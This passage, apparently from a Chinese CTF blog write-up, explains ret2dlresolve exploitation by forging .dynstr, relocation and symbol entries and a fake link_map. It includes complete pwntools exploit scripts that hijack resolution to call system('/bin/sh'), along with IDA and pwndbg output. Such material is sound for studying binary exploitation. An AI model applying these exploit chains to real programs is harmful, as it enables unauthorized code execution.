#1add(0x20,&#39;/bin/sh\x00/bin/sh\x00&#39;.ljust(0x20,&#39;\x00&#39;)) #2 payload = b&#39;a&#39;*0x20 + p64(0) + p64(0x21) + p64(0x80) + p64(fake_dynstr_addr)edit(0,0x40,payload)#伪造dynstredit(1,len(fake_dynstr),fake_dynstr)payload = b&#39;a&#39;*0x20 + p64(0) + p64(0x21) + p64(0x80) + p64(dt_strtab)edit(0,0x40,payload)#修改dynstr指针 即.dynamic的字符串表指针edit(1,0x8,p64(fake_dynstr_addr))# 这里应该是将free_got中存的改成plt表 也就是不只是第一次调用 每次调用都会触发解析 dlresolve都会执行# 这个exp中因为是第一次调用 所以不写这些也能成功getshellpayload = b&#39;a&#39;*0x20 + p64(0) + p64(0x21) + p64(0x80) + p64(free_got)edit(0,0x40,payload)#修改dynstr指针edit(1,0x8,p64(free_plt))#getshelldelete(2) sh.interactive()<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs tap"><br>```asm<br>LOAD:00000000004003F8                               ; ELF String Table<br>LOAD:00000000004003F8<span class="hljs-number"> 00 </span>                           byte_4003F8 db<span class="hljs-number"> 0 </span>                       ; DATA XREF: LOAD:00000000004002D8↑o<br>LOAD:00000000004003F8                                                                       ; LOAD:00000000004004A0↓o<br>LOAD:00000000004003F8                                                                       ; <br>LOAD:00000000004003F9 6C<span class="hljs-number"> 69 </span>62<span class="hljs-number"> 63 </span>2E<span class="hljs-number"> 73 </span>6F 2E<span class="hljs-number"> 36 </span>00 aLibcSo6 db &#x27;libc.so.6&#x27;,0               ; DATA XREF: LOAD:00000000004004A0↓o<br>LOAD:0000000000400403<span class="hljs-number"> 65 </span>78<span class="hljs-number"> 69 </span>74<span class="hljs-number"> 00 </span>               aExit db &#x27;exit&#x27;,0                       ; DATA XREF: LOAD:00000000004003C8↑o<br>LOAD:0000000000400408 5F 5F<span class="hljs-number"> 73 </span>74<span class="hljs-number"> 61 </span>63 6B 5F<span class="hljs-number"> 63 </span>68+aStackChkFail db &#x27;__stack_chk_fail&#x27;,0   ; DATA XREF: LOAD:00000000004002F0↑o<br>LOAD:0000000000400419<span class="hljs-number"> 73 </span>74<span class="hljs-number"> 64 </span>69 6E<span class="hljs-number"> 00 </span>            aStdin db &#x27;stdin&#x27;,0                     ; DATA XREF: LOAD:00000000004003E0↑o<br>LOAD:000000000040041F<span class="hljs-number"> 63 </span>61 6C 6C 6F<span class="hljs-number"> 63 </span>00          aCalloc db &#x27;calloc&#x27;,0                   ; DATA XREF: LOAD:0000000000400368↑o<br>LOAD:0000000000400426 6D<span class="hljs-number"> 65 </span>6D<span class="hljs-number"> 73 </span>65<span class="hljs-number"> 74 </span>00          aMemset db &#x27;memset&#x27;,0                   ; DATA XREF: LOAD:0000000000400308↑o<br>LOAD:000000000040042D<span class="hljs-number"> 72 </span>65<span class="hljs-number"> 61 </span>64<span class="hljs-number"> 00 </span>               aRead db &#x27;read&#x27;,0                       ; DATA XREF: LOAD:0000000000400338↑o<br>LOAD:0000000000400432<span class="hljs-number"> 61 </span>6C<span class="hljs-number"> 61 </span>72 6D<span class="hljs-number"> 00 </span>            aAlarm db &#x27;alarm&#x27;,0                     ; DATA XREF: LOAD:0000000000400320↑o<br>LOAD:0000000000400438<span class="hljs-number"> 61 </span>74 6F<span class="hljs-number"> 69 </span>00                aAtoi db &#x27;atoi&#x27;,0                       ; DATA XREF: LOAD:00000000004003B0↑o<br>LOAD:000000000040043D<span class="hljs-number"> 73 </span>65<span class="hljs-number"> 74 </span>76<span class="hljs-number"> 62 </span>75<span class="hljs-number"> 66 </span>00       aSetvbuf db &#x27;setvbuf&#x27;,0                 ; DATA XREF: LOAD:0000000000400398↑o<br>LOAD:0000000000400445 5F 5F 6C<span class="hljs-number"> 69 </span>62<span class="hljs-number"> 63 </span>5F<span class="hljs-number"> 73 </span>74 61+aLibcStartMain db &#x27;__libc_start_main&#x27;,0 ; DATA XREF: LOAD:0000000000400350↑o<br>LOAD:0000000000400457<span class="hljs-number"> 66 </span>72<span class="hljs-number"> 65 </span>65<span class="hljs-number"> 00 </span>               aFree db &#x27;free&#x27;,0                       ; DATA XREF: LOAD:00000000004002D8↑o<br>LOAD:000000000040045C 5F 5F<span class="hljs-number"> 67 </span>6D 6F 6E 5F<span class="hljs-number"> 73 </span>74 61+aGmonStart db &#x27;__gmon_start__&#x27;,0        ; DATA XREF: LOAD:0000000000400380↑o<br>LOAD:000000000040046B<span class="hljs-number"> 47 </span>4C<span class="hljs-number"> 49 </span>42<span class="hljs-number"> 43 </span>5F<span class="hljs-number"> 32 </span>2E<span class="hljs-number"> 34 </span>00 aGlibc24 db &#x27;GLIBC_2.4&#x27;,0               ; DATA XREF: LOAD:00000000004004B0↓o<br>LOAD:0000000000400475<span class="hljs-number"> 47 </span>4C<span class="hljs-number"> 49 </span>42<span class="hljs-number"> 43 </span>5F<span class="hljs-number"> 32 </span>2E<span class="hljs-number"> 32 </span>2E+aGlibc225 db &#x27;GLIBC_2.2.5&#x27;,0            ; DATA XREF: LOAD:00000000004004C0↓o<br>LOAD:0000000000400481<span class="hljs-number"> 00 </span>                           align 2<br></code></pre></td></tr></table></figure>* 但是打本地不出flag 换成Ubuntu18.04的就可以啦 好好好 又是libc版本的问题   但我看了换的版本是对的啊  mad 没换版本就能通  嗷是在本地找不到对应2.27的libc是吗可能</code></pre></li><li><p>相当于是只修改了第4步的.dynstr 其他都是free函数的</p><blockquote><ol><li>用<code>link_map</code>访问<code>.dynamic</code>，取出<code>.dynstr</code>, <code>.dynsym</code>, <code>.rel.plt</code>的指针</li><li><code>.rel.plt + 第二个参数</code>求出当前函数的重定位表项<code>Elf32_Rel</code>的指针，记作<code>rel</code></li><li><code>rel-&gt;r_info &gt;&gt; 8</code>作为<code>.dynsym</code>的下标，求出当前函数的符号表项<code>Elf32_Sym</code>的指针，记作<code>sym</code></li><li><code>.dynstr + sym-&gt;st_name</code>得出符号名字符串指针</li><li>在动态链接库查找这个函数的地址，并且把地址赋值给<code>*rel-&gt;r_offset</code>，即GOT表</li><li>调用这个函数</li></ol></blockquote></li><li><p>然后还有个注意的点是输入op size的时候都是1字节 所以发的形式</p></li></ul><h4 id="3-2-构造link-map"><a href="#3-2-构造link-map" class="headerlink" title="3.2 构造link_map"></a>3.2 构造link_map</h4><blockquote><p><code>_dl_runtime_resolve</code>在第二步时<code>.rel.plt + 第二个参数</code>求出当前函数的重定位表项<code>Elf32_Rel</code>的指针，记作<code>rel</code></p><p>这个时候，<code>_dl_runtime_resolve</code>并没有检查<code>.rel.plt + 第二个参数</code>后是否造成越界访问，所以我们能给一个很大的<code>.rel.plt</code>的offset（64位的话就是下标），然后使得加上去之后的地址指向我们所能操纵的一块内存空间，比方说<code>.bss</code>。</p><p>然后第三步<code>rel-&gt;r_info &gt;&gt; 8</code>作为<code>.dynsym</code>的下标，求出当前函数的符号表项<code>Elf32_Sym</code>的指针，记作<code>sym</code></p><p>所以在我们所伪造的<code>Elf32_Rel</code>，需要放一个<code>r_info</code>字段，大概长这样就行<code>0xXXXXXX07</code>，其中XXXXXX是相对<code>.dynsym</code>表的下标，注意不是偏移，所以是偏移除以<code>Elf32_Sym</code>的大小，即除以<code>0x10</code>（32位下）。然后这里同样也没有进行越界访问的检查，所以可以用类似的方法，伪造出这个<code>Elf32_Sym</code>。至于为什么是07，因为这是一个导入函数，而导入函数一般都是07，所以写成07就好。</p><p>然后第四步<code>.dynstr + sym-&gt;st_name</code>得出符号名字符串指针 同样类似，没有进行越界访问检查，所以这个字符串也能够伪造。</p><p>构造ROP，跳转到resolve的PLT，<code>push link_map</code>的位置，就是上图所示的这个地方。此时，栈中必须要有已经伪造好的指向伪造的<code>Elf32_Rel</code>的偏移，然后是返回地址（<code>system</code>的话无所谓），再然后是参数（如果是<code>system</code>函数的话就要是指向<code>&quot;/bin/sh\x00&quot;</code>的指针）</p></blockquote><h6 id="32位PartialRELRO–xdctf2015-pwn200"><a href="#32位PartialRELRO–xdctf2015-pwn200" class="headerlink" title="32位PartialRELRO–xdctf2015_pwn200"></a>32位PartialRELRO–xdctf2015_pwn200</h6><ul><li><p>这题也可以用ret2libc</p></li><li><p>发现师傅们用的pwntools的rop模块 也支持x64</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>elf = ELF(<span class="hljs-string">&#x27;bof&#x27;</span>)<br>sh = process(<span class="hljs-string">&#x27;./bof&#x27;</span>)<br>rop = ROP(<span class="hljs-string">&#x27;./bof&#x27;</span>)<br><br>offset = <span class="hljs-number">112</span><br>bss_addr = elf.bss() <span class="hljs-comment">#获取bss段首地址</span><br><br>sh.recvuntil(<span class="hljs-string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)<br><br><span class="hljs-comment">## 将栈迁移到bss段</span><br><span class="hljs-comment">## 新栈空间大小为0x800</span><br>stack_size = <span class="hljs-number">0x800</span><br>base_stage = bss_addr + stack_size <br><span class="hljs-comment">### 填充缓冲区</span><br>rop.raw(<span class="hljs-string">&#x27;a&#x27;</span> * offset) <br><span class="hljs-comment">### 向新栈中写100个字节</span><br><span class="hljs-comment">##rop.read会自动完成read函数、函数参数、返回地址的栈部署</span><br>rop.read(<span class="hljs-number">0</span>, base_stage, <span class="hljs-number">100</span>)<br><span class="hljs-comment">### 栈迁移, 设置esp = base_stage</span><br><span class="hljs-comment">##rop.migrate会利用leave_ret自动部署迁移工作</span><br>rop.migrate(base_stage)<br>sh.sendline(rop.chain())<br>gdb.attach(sh)<br>pause()<br><br><span class="hljs-comment"># 打印字符串&quot;/bin/sh&quot;</span><br>rop = ROP(<span class="hljs-string">&#x27;./bof&#x27;</span>)<br>BIN = <span class="hljs-string">&quot;/bin/sh\x00&quot;</span><span class="hljs-comment">##众所周知一般的函数遇到 \0 才会结束读取，所以为了防止system(&#x27;/bin/shaaaaaaaa....aaaaa&#x27;)的情况，我们要加上\0</span><br><span class="hljs-comment">## 获取plt0地址</span><br>plt0 = elf.get_section_by_name(<span class="hljs-string">&#x27;.plt&#x27;</span>).header.sh_addr<br><span class="hljs-comment">## 获取.rel.plt地址</span><br>rel_plt = elf.get_section_by_name(<span class="hljs-string">&#x27;.rel.plt&#x27;</span>).header.sh_addr<br><span class="hljs-comment">## 获得.dynsym地址</span><br>dynsym = elf.get_section_by_name(<span class="hljs-string">&#x27;.dynsym&#x27;</span>).header.sh_addr<br><span class="hljs-comment">## 获得.dynstr地址</span><br>dynstr = elf.get_section_by_name(<span class="hljs-string">&#x27;.dynstr&#x27;</span>).header.sh_addr<br>align = <span class="hljs-number">0x10</span>-(base_stage+<span class="hljs-number">32</span>-dynsym)%<span class="hljs-number">16</span><br><span class="hljs-built_in">print</span>(align)<span class="hljs-comment"># 4</span><br>fake_sym_addr = align + base_stage + <span class="hljs-number">32</span><br>st_name = fake_sym_addr +<span class="hljs-number">16</span> - dynstr<span class="hljs-comment"># 伪造的地址相对于dynstr的偏移</span><br>st_value=<span class="hljs-number">0</span><br>st_size=<span class="hljs-number">0</span><br>st_info=<span class="hljs-number">0x12</span><br>fake_reloc_arg = base_stage + <span class="hljs-number">24</span> - rel_plt<br>r_offset = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>index_write = (fake_sym_addr - dynsym)/<span class="hljs-number">16</span> <span class="hljs-comment">##注意这里要用地板除，float不能左移</span><br><span class="hljs-built_in">print</span>(index_write)<br>r_info = (<span class="hljs-built_in">int</span>(index_write)&lt;&lt;<span class="hljs-number">8</span>)+<span class="hljs-number">0x7</span><span class="hljs-comment">##利用构造的dyndym地址反推r_info</span><br><span class="hljs-built_in">print</span>(r_info)<br><span class="hljs-built_in">print</span>(st_name)<br><br>rop.raw(plt0)<span class="hljs-comment"># 执行plt0就是执行dl_resolve </span><br><span class="hljs-comment"># 可以通过plt的地址加上目标函数的offset来调用函数，以如下方式调用write函数</span><br>rop.raw(fake_reloc_arg)<span class="hljs-comment"># 偏移</span><br>rop.raw(<span class="hljs-string">&#x27;bbbb&#x27;</span>) <span class="hljs-comment">#write函数返回地址</span><br>rop.raw(base_stage + <span class="hljs-number">59</span>) <span class="hljs-comment"># /bin/sh\x00</span><br>rop.raw(<span class="hljs-string">&#x27;aaaa&#x27;</span>)<span class="hljs-comment">##事实上因为system只需要一个参数，另外两个都不用写，但为了不破坏原有的布局就填上垃圾数据即可</span><br>rop.raw(<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br><br>rop.raw(r_offset) <span class="hljs-comment">##构造的ELF_REL 伪造write为system</span><br>rop.raw(r_info)<span class="hljs-comment"># 形式应为[在.dynsym中的indx或者说偏移]07</span><br><br>rop.raw(<span class="hljs-string">&#x27;a&#x27;</span>*align)<span class="hljs-comment"># .dynsym 每一项的大小都是0x10 伪造.dynsym表项时，需要与.dynsym的起始位置对齐</span><br>rop.raw(st_name) <span class="hljs-comment">##构造的.dynsym</span><br>rop.raw(st_value)<span class="hljs-comment"># 0</span><br>rop.raw(st_size)<span class="hljs-comment"># 0</span><br>rop.raw(st_info)<span class="hljs-comment"># 0x12</span><br><br>rop.raw(<span class="hljs-string">&#x27;system\x00&#x27;</span>)<span class="hljs-comment">##伪造的.dynstr</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;len:rop.chain():&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(rop.chain()))<span class="hljs-comment">#长度为58，所以可以在base_stage + 59写上/bin/sh</span><br>rop.raw(BIN)<br>rop.raw(<span class="hljs-string">&#x27;a&#x27;</span> * (<span class="hljs-number">100</span> - <span class="hljs-built_in">len</span>(rop.chain())))<br>sh.sendline(rop.chain())<br>sh.interactive()<br></code></pre></td></tr></table></figure><ul><li><pre><code class="python">rop.raw(plt0)# 执行plt0就是执行dl_resolve rop.raw(fake_reloc_arg)# 偏移rop.raw(&#39;bbbb&#39;) #write函数返回地址rop.raw(base_stage + 59) # /bin/sh\x00rop.raw(&#39;aaaa&#39;)##事实上因为system只需要一个参数，另外两个都不用写，但为了不破坏原有的布局就填上垃圾数据即可rop.raw(&#39;aaaa&#39;)<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>  这里是通过plt的地址加上目标函数的offset来调用write函数 比如我们平常写的rop为`p32(write_plt) + b&#x27;bbbb&#x27; + p32(<span class="hljs-number">1</span>) + p32(addr) + p32(size)` 这里也类似 只是write_plt用plt[<span class="hljs-number">0</span>]和偏移来表示<br><br>* 这里的执行过程就是<br><br>  &gt; <span class="hljs-number">1</span>. 调用write伪造的system函数--&gt;因为是第一次调用会触发_dl_resolve<br>  &gt; <span class="hljs-number">2</span>. 用`link_map`访问`.dynamic`，取出`.dynstr`, `.dynsym`, `.rel.plt`的指针，`.rel.plt + fake_reloc_arg`求出当前函数的重定位表项`Elf32_REL`的指针<br>  &gt; <span class="hljs-number">3</span>. 根据`Elf32_REL`-&gt;r_info 求出当前函数的符号表项`Elf32_Sym`的指针，记作`sym`<br>  &gt; <span class="hljs-number">4</span>. `.dynstr + sym-&gt;st_name`得出符号名字符串指针<br>  &gt; <span class="hljs-number">5</span>. 在动态链接库查找这个函数的地址，并且把地址赋值给`*rel-&gt;r_offset`，即GOT表<br>  &gt; <span class="hljs-number">6</span>. 调用这个函数<br><br>* ```shell<br><span class="hljs-title">  02:</span><span class="hljs-number">0008</span>│ ecx <span class="hljs-number">0</span>x804a828 —▸ <span class="hljs-number">0</span>xf7f0ca40 ◂— <span class="hljs-number">0</span>x0<br><span class="hljs-title">  03:</span><span class="hljs-number">000</span>c│     <span class="hljs-number">0</span>x804a82c ◂— <span class="hljs-number">0</span>x251c<br><span class="hljs-title">  04:</span><span class="hljs-number">0010</span>│     <span class="hljs-number">0</span>x804a830 ◂— <span class="hljs-number">0</span>x62626262 (&#x27;bbbb&#x27;)<br><span class="hljs-title">  05:</span><span class="hljs-number">0014</span>│     <span class="hljs-number">0</span>x804a834 —▸ <span class="hljs-number">0</span>x804a863 ◂— &#x27;/bin/sh&#x27;<br><span class="hljs-title">  06:</span><span class="hljs-number">0018</span>│     <span class="hljs-number">0</span>x804a838 ◂— <span class="hljs-number">0</span>x61616161 (&#x27;aaaa&#x27;)<br><span class="hljs-title">  07:</span><span class="hljs-number">001</span>c│     <span class="hljs-number">0</span>x804a83c ◂— <span class="hljs-number">0</span>x61616161 (&#x27;aaaa&#x27;)<br><span class="hljs-title">  08:</span><span class="hljs-number">0020</span>│     <span class="hljs-number">0</span>x804a840 —▸ <span class="hljs-number">0</span>x804a01c (write@got[plt]) —▸ <span class="hljs-number">0</span>xf7c48170 (system) ◂— endbr32 <br><span class="hljs-title">  09:</span><span class="hljs-number">0024</span>│     <span class="hljs-number">0</span>x804a844 ◂— <span class="hljs-number">0</span>x26807<br><span class="hljs-title">  0a:</span><span class="hljs-number">0028</span>│     <span class="hljs-number">0</span>x804a848 ◂— <span class="hljs-number">0</span>x61616161 (&#x27;aaaa&#x27;)<br><span class="hljs-title">  0b:</span><span class="hljs-number">002</span>c│     <span class="hljs-number">0</span>x804a84c ◂— <span class="hljs-number">0</span>x25f0<br><span class="hljs-title">  0c:</span><span class="hljs-number">0030</span>│     <span class="hljs-number">0</span>x804a850 ◂— <span class="hljs-number">0</span>x0<br><span class="hljs-title">  0d:</span><span class="hljs-number">0034</span>│     <span class="hljs-number">0</span>x804a854 ◂— <span class="hljs-number">0</span>x0<br><span class="hljs-title">  0e:</span><span class="hljs-number">0038</span>│     <span class="hljs-number">0</span>x804a858 ◂— <span class="hljs-number">0</span>x12<br><span class="hljs-title">  0f:</span><span class="hljs-number">003</span>c│     <span class="hljs-number">0</span>x804a85c ◂— &#x27;system&#x27;<br><span class="hljs-title">  10:</span><span class="hljs-number">0040</span>│     <span class="hljs-number">0</span>x804a860 ◂— <span class="hljs-number">0</span>x2f006d65 <span class="hljs-comment">/* &#x27;em&#x27; */</span><br><span class="hljs-title">  11:</span><span class="hljs-number">0044</span>│     <span class="hljs-number">0</span>x804a864 ◂— &#x27;bin/sh&#x27;<br><span class="hljs-title">  12:</span><span class="hljs-number">0048</span>│     <span class="hljs-number">0</span>x804a868 ◂— <span class="hljs-number">0</span>x61006873 <span class="hljs-comment">/* &#x27;sh&#x27; */</span><br><span class="hljs-title">  13:</span><span class="hljs-number">004</span>c│     <span class="hljs-number">0</span>x804a86c ◂— &#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;<br>  ... ↓        <span class="hljs-number">7</span> skipped<br></code></pre></td></tr></table></figure></code></pre></li><li><p>为啥要迁移：当然是溢出的不够多啊 然后这里的迁移其实还挺不一样的 用了pop_ebp_ret leave_ret两个gadget 但是应该只考栈迁移的并不需要这么构造 到高版本的libc也没有这么多gadget</p></li><li><pre><code class="python">from pwn import *io = process(&quot;./bof&quot;)context.arch = &#39;i386&#39;elf = ELF(&quot;./bof&quot;)pop_esi_edi_ebp_ret = 0x08048629leave_ret = 0x08048445pop_ebp_ret = 0x0804862bstack_size = 0x800bss_addr = elf.bss() #获取bss段首地址base_stage = bss_addr + stack_sizeread_plt = elf.plt[&#39;read&#39;]io.recv()payload = b&#39;a&#39;*112payload += p32(read_plt)payload += p32(pop_esi_edi_ebp_ret) + p32(0) + p32(base_stage) + p32(0x500)payload += p32(pop_ebp_ret) + p32(base_stage-4) + p32(leave_ret)io.sendline(payload)plt0 = 0x8048370rel_plt = 0x8048324dynsym = 0x80481ccdynstr = 0x804826calign = 0x10-(base_stage+32-dynsym)%16fake_relloc = base_stage + 24 - rel_pltfake_sym_addr = base_stage + align + 32r_offset = elf.got[&#39;write&#39;]index_write = (fake_sym_addr - dynsym)/16r_info = (int(index_write)&lt;&lt;8)+0x7gdb.attach(io)pause()st_name = fake_sym_addr + 16 - dynstrst_value = 0st_size = 0st_info = 0x12payload2 = p32(plt0) + p32(fake_relloc)payload2 += b&#39;aaaa&#39; + p32(base_stage+59) + b&#39;aaaa&#39; + b&#39;aaaa&#39;payload2 += p32(r_offset) + p32(r_info)payload2 += b&#39;a&#39;*align + p32(st_name) + p32(st_value) + p32(st_size) + p32(st_info)payload2 += b&#39;system\0&#39; + b&#39;/bin/sh\x00&#39;io.sendline(payload2)io.interactive()<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>    * 但stack_size得是<span class="hljs-number">0x800</span><span class="hljs-number">-990</span>之间大概 可能太小和太大了导致迁移的位置有点问题（猜的<br><br>###### <span class="hljs-number">64</span>位PatialRELRO--geek_challenge2023-why_n0t_puts<br><br>* &gt;vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="hljs-number">0x7fff</span>的过程中，由于我们一般伪造的symtab位于bss段，就导致在<span class="hljs-number">64</span>位下`reloc-&gt;r_info`比较大,故程序会发生错误<br>  &gt;<br>  &gt;需要控制 **link_map** 中的**l_addr**和 **sym**中的**st_value**<br><br>* ```python<br>  <span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>  context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span> <br>  context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span> <br>  io=process(<span class="hljs-string">&quot;./why_n0t_puts&quot;</span>)<br>  elf=ELF(<span class="hljs-string">&quot;./why_n0t_puts&quot;</span>) <br>  # libc=elf.libc<br>  libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>  <br>  def create_link_map(l_addr,know_got,link_map_addr): <br>      link_map=p64(l_addr &amp; (<span class="hljs-number">2</span> ** <span class="hljs-number">64</span> - <span class="hljs-number">1</span>))    # offset是负的 所以作了处理<br>      # DT_JMPREL<br>      link_map+=p64(<span class="hljs-number">0</span>)<br>      link_map+=p64(link_map_addr+<span class="hljs-number">0x18</span>) <br>      #ptr2relplt  <br>      link_map+=p64((know_got - l_addr)&amp;(<span class="hljs-number">2</span>**<span class="hljs-number">64</span><span class="hljs-number">-1</span>))    #r_offset 因为是负数所以用了-？<br>      link_map+=p64(<span class="hljs-number">0x7</span>)  # r_info 只会检查最低位<br>      link_map+=p64(<span class="hljs-number">0</span>)    # r_addend<br>      #dyn_symtab         <br>      link_map+=p64(<span class="hljs-number">0</span>)    # <br>      link_map+=p64(know_got<span class="hljs-number">-0x8</span>) # sym表首地址<br>      link_map+=b<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span> <br>  <br>      link_map=link_map.ljust(<span class="hljs-number">0x68</span>,b<span class="hljs-string">&#x27;B&#x27;</span>)<br>      link_map+=p64(link_map_addr)        # 字符串表指针的指针，随便写个地址就行，反正用不到<br>      link_map+=p64(link_map_addr+<span class="hljs-number">0x30</span>)   # DT_SYMTAB在 DYNAMIC中对应的结构的地址<br>      link_map=link_map.ljust(<span class="hljs-number">0xf8</span>,b<span class="hljs-string">&#x27;C&#x27;</span>)<br>      link_map+=p64(link_map_addr+<span class="hljs-number">0x8</span>)    # relplt_addr<br>      return link_map<br>  <br>  rdi=<span class="hljs-number">0x4011d3</span> <br>  rsi_r15=<span class="hljs-number">0x4011d1</span><br>  fake_link_map_addr = elf.bss() + <span class="hljs-number">0x200</span><br>  # fake_link_map_addr=<span class="hljs-number">0x404800</span> <br>  data=<span class="hljs-number">0x404500</span> <br>  sh=fake_link_map_addr+<span class="hljs-number">0x40</span><br>  call = <span class="hljs-number">0x401026</span>  # 调用dlresolve<br>  <br>  offset=libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]-libc.symbols[<span class="hljs-string">&#x27;read&#x27;</span>] <br>  fake_link_map=create_link_map(offset,elf.got[<span class="hljs-string">&#x27;read&#x27;</span>],fake_link_map_addr) <br>  print(len(fake_link_map)) <br>  payload = b<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span><br>  payload += p64(rdi)+p64(<span class="hljs-number">0</span>)<br>  payload += p64(rsi_r15)+p64(fake_link_map_addr)+p64(<span class="hljs-number">0</span>)<br>  payload += p64(rsi_r15)+p64(fake_link_map_addr)+p64(<span class="hljs-number">0</span>)  # 栈<span class="hljs-number">16</span>字节对齐,不然调用不了<span class="hljs-keyword">system</span><br>  payload += p64(elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>])<br>  payload += p64(rdi)+p64(sh)<br>  payload += p64(call)+p64(fake_link_map_addr)+p64(<span class="hljs-number">0</span>)     # 调用dlresolve 传入link_map和索引<br>  io.send(payload)<br>  <br>  # gdb.attach(io)<br>  # pause()<br>  io.send(fake_link_map) <br>  <br>  io.interactive()<br></code></pre></td></tr></table></figure></code></pre></li></ul></li><li><pre><code class="shell">pwndbg&gt; tele 0x40423000:0000│ rsi 0x404230 ◂— 0xfffffffffff442d001:0008│     0x404238 ◂— 0x002:0010│     0x404240 —▸ 0x404248 ◂— 0x4bfd4803:0018│     0x404248 ◂— 0x4bfd4804:0020│     0x404250 ◂— 0x705:0028│     0x404258 ◂— 0x006:0030│     0x404260 ◂— 0x007:0038│     0x404268 —▸ 0x404010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0x7fdc33f7fd30 (_dl_runtime_resolve_xsavec) ◂— endbr64 pwndbg&gt; tele 0x404230 4000:0000│ rsi 0x404230 ◂— 0xfffffffffff442d001:0008│     0x404238 ◂— 0x002:0010│     0x404240 